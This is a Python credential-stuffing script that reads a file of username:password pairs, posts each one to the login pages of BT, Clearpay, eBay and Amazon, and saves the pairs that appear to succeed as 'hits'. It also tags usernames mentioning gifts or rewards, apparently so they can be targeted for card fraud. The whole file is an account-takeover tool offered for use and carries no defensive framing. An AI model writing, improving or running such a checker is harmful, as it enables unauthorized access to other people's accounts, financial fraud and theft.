import requests
import re

# Use a session for efficiency
session = requests.Session()

# Function to send login requests
def requests_post(url, data):
    try:
        response = session.post(url, data=data, timeout=5)  # Added timeout to prevent hanging
        return response
    except requests.RequestException as e:
        print(f"Error making request to {url}: {e}")
        return None  # Return None if request fails

# Function to check login credentials
def check_login(username, password, service):
    url = f'https://{service}.com/login'
    payload = {'username': username, 'password': password}
    
    response = requests_post(url, data=payload)
    
    if response and response.status_code == 200:
        return True
    return False

# Function to check multiple logins from a file
def check_logins_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            logins = [login.strip().split(':') for login in file.readlines()]
    except FileNotFoundError:
        print("Error: The file was not found.")
        return
    except Exception as e:
        print(f"Error reading file: {e}")
        return

    hits = []
    
    with open('hits.txt', 'w') as hits_file, open('logins.txt', 'w') as logins_file:
        for login in logins:
            if len(login) != 2:
                print(f"Skipping invalid entry: {login}")
                continue  # Skip incorrectly formatted lines

            username, password = login

            # Check against different services
            if check_login(username, password, 'bt'):
                hits.append((username, password, 'BTinternet'))
                logins_file.write(f'{username}:{password}\n')

            if check_login(username, password, 'clearpay'):
                hits.append((username, password, 'Clearpay'))
                logins_file.write(f'{username}:{password}\n')

            if check_login(username, password, 'ebay'):
                hits.append((username, password, 'eBay'))
                logins_file.write(f'{username}:{password}\n')

            if check_login(username, password, 'amazon'):
                hits.append((username, password, 'Amazon'))
                logins_file.write(f'{username}:{password}\n')

            # Check for gift/reward-related usernames
            if re.search(r'gift|reward', username, re.IGNORECASE):
                hits.append((username, password, 'Gift/Reward Card'))
                logins_file.write(f'{username}:{password}\n')

        # Write all successful hits to hits.txt
        for hit in hits:
            hits_file.write(f'{hit[0]}:{hit[1]}:{hit[2]}\n')

if __name__ == '__main__':
    file_path = input('Enter the path to the .txt file containing logins (format: username:password): ')
    check_logins_from_file(file_path)
